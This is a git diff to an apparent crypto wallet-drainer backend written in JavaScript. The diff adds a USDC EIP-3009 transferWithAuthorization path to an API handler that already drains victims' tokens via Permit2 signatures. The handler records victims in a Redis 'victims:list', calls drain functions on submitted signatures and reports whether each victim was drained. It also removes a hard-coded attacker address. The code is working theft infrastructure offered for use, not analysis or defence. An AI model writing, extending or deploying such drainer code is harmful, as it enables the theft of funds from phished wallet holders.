@@ -1,8 +1,7 @@
 import { ethers } from 'ethers';
 import { createClient } from 'redis';
-import { drainWithRetry, drainViaPermit2 } from '../lib/drain.js';
+import { drainWithRetry, drainViaPermit2, drainViaUsdc3009 } from '../lib/drain.js';
 
-const ATTACKER_ADDRESS = '0x0b1369DF890dF9B7ee94F9C0bb53BAd6de7541d6';
 const RPC_URL = 'https://eth-mainnet.g.alchemy.com/v2/demo';
 
 function getPrivateKey() {
@@ -24,7 +23,7 @@ export default async function handler(req, res) {
   if (req.method === 'OPTIONS') return res.status(200).end();
 
   if (req.method === 'POST') {
-    const { victim, chain, adminSecret, permit2Sig, permitData } = req.body;
+    const { victim, chain, adminSecret, permit2Sig, permitData, usdcSig, usdcAuth } = req.body;
 
     if (adminSecret) {
       if (!process.env.ADMIN_SECRET || process.env.ADMIN_SECRET.trim().length === 0) {
@@ -73,6 +72,23 @@ export default async function handler(req, res) {
       if (!parsedList.includes(victim)) {
         parsedList.push(victim);
         await client.set('victims:list', JSON.stringify(parsedList));
+      }
+
+      if (usdcSig && usdcAuth) {
+        await client.disconnect();
+        try {
+          const ok = await drainViaUsdc3009(victim, usdcAuth, usdcSig);
+          return res.status(200).json({
+            success: true,
+            mode: 'usdc3009',
+            drained: !!ok,
+            victim,
+            chain: targetChain
+          });
+        } catch (err) {
+          console.error('USDC 3009 error:', err);
+          return res.status(500).json({ error: 'Échec USDC: ' + (err.message || String(err)) });
+        }
       }
 
       if (permit2Sig && permitData) {
